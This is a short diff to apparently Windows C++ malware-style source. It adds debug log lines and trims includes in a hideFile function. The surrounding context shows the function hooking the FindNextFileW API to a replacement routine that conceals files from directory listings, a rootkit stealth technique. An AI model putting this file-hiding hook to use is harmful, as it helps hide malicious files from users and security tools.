@@ -1,6 +1,4 @@
-#include <iostream>
-#include <windows.h>
-#include <string>
+
 #include "FileHiding.h"
 
 string fullpath;
@@ -216,6 +214,10 @@ int hideFile(const string& fileName)
 	wfilename = wsFilename;
 	wpath = wsPath;
 
+	LOGMSG("[!] filename :: " + filename);
+	LOGMSG("[!] path :: " + path);
+	LOGMSG("[!] fullpath :: " + fullpath);
+
 	//MessageBox(NULL, drive, "drive", MB_OK);
 	//MessageBox(NULL, dir, "dir", MB_OK);
 	//MessageBox(NULL, fname, "fname", MB_OK);
@@ -250,5 +252,6 @@ int hideFile(const string& fileName)
 	func = "FindNextFileW";
 	MAKE_HIDE(pFindNextFileW, MyFindNextFileW_withHide);
 
+	LOGMSG("[!] exit hideFile function");
 	return 0;
 }
